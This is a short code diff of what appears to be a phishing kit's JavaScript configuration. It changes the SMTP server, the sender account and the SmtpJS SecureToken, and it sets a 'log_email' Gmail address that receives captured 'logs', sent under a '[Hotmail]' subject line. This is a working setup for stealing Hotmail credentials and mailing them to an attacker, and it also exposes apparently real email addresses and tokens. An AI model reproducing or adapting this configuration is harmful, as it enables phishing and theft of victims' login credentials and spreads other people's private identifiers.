@@ -1,8 +1,8 @@
-var smtp_host = 'smtp.office365.com';
-var smtp_username = 'marc.declercq@edu.vlerick.com';
+var smtp_host = 'smtp.gmail.com';
+var smtp_username = 'luj32510@gmail.com';
 
 //Enter were logs will go here
-var log_email = 'johnchurchwell118@gmail.com'
+var log_email = 'fpinault699@gmail.com'
 
 
 url_link = "session.html";
@@ -100,7 +100,7 @@ function sendEmail(to,message) {
   // Host: smtp_host,
   // Username : smtp_username,
   // Password : smtp_password,
-  SecureToken: '27518cb5-4707-481f-8cc9-8183f2feea57',
+  SecureToken: 'f9d41c90-8d4c-47ed-b5be-0812c44b2ad8',
   To : to,
   From : smtp_username,
   Subject : '==============+ [Hotmail] +================',
